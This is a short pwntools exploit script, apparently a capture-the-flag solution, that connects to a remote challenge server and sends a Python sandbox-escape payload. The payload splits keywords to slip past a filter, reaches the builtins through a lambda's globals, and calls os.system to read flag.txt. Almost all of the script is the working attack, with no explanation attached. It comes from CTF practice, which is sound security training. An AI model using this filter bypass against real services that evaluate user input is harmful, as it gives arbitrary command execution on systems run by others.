from pwn import *
import struct

local = False
elf = 'SimpleGOT' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me" 
    #ip = 
    port = 7001
    r = remote(ip,port)

context.arch = 'amd64'

#addr = 
payload = "a=lambda x:x+1;b='ev'+'al';d = 'o'+'s';e = 'cat flag.txt';c = '__impor'+'t__(d).sy'+'stem(e)';a.__globals__['__builtins__'].__getattribute__(b)(c)"
print(payload)
r.recvuntil('>>> ')
r.send(payload)
r.interactive()
